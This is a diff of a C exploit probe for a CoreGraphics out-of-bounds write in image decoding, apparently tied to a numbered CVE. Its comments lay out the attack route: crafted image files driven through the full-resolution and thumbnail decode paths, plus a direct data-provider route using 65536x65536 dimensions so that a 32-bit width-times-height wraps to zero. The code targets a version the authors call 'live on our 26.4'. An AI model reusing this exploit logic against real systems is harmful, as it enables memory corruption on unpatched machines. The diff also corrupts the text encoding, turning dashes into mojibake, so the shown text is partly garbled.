@@ -1,9 +1,9 @@
-/*
- * cg86950_pure.c — the CVE-2026-86950 CoreGraphics OOB-write stage-A probe.
+﻿/*
+ * cg86950_pure.c â€” the CVE-2026-86950 CoreGraphics OOB-write stage-A probe.
  * Build: $CC -O2 -g -o CG86950 cg86950_pure.c -framework CoreGraphics -framework ImageIO -framework CoreFoundation
  *
- * Route (the CVE's own shape — Meta Product Security credit, fixed 26.7.1, live on our 26.4):
- *   CGImageSourceCreateWithURL on the crafted file -> both decode paths driven —
+ * Route (the CVE's own shape â€” Meta Product Security credit, fixed 26.7.1, live on our 26.4):
+ *   CGImageSourceCreateWithURL on the crafted file -> both decode paths driven â€”
  *     (1) FULL-res CGImageSourceCreateImageAtIndex (the real alloc path)
  *     (2) CGImageSourceCreateThumbnailAtIndex max-size 4096 (the PoC-class path)
  *     (3) CGDataProviderCreateDirect over a second odd-sized record -> CGImageCreate
@@ -29,6 +29,7 @@
 #include <time.h>
 #include <stdarg.h>
 
+static int file_copy(const char *src, const char *dst);
 static FILE *g_report = NULL;
 
 static void report_open(void)
@@ -215,14 +216,14 @@ static void fire_round(const char *name, const char *round_label)
 }
 
 /* a second crafted-object route: build a DIRECT data-provider over our own buffer
-   and hand CGImageCreate an image whose geometry the codec must trust — the
+   and hand CGImageCreate an image whose geometry the codec must trust â€” the
    CVE-86950 class also fires on internally-built image objects (the "crafted"
    branch that bypasses ImageIO sniffing). */
 static void fire_direct_round(void)
 {
     rline("direct route: CGDataProviderCreateDirect + CGImageCreate (the internal-object class)");
-    const size_t big = 1u << 30;   /* one gigabyte row-space» the OOB-write shape */
-    const size_t w = 65536, h = 65536;  /* 32-bit wraps to 0 — the multiply class */
+    const size_t big = 1u << 30;   /* one gigabyte row-spaceÂ» the OOB-write shape */
+    const size_t w = 65536, h = 65536;  /* 32-bit wraps to 0 â€” the multiply class */
     rlinef("  target dims %zux%zu (product overflows a 32-bit width*height)", w, h);
 
     /* craft the record buffer ourselves (the crafted-image class) */
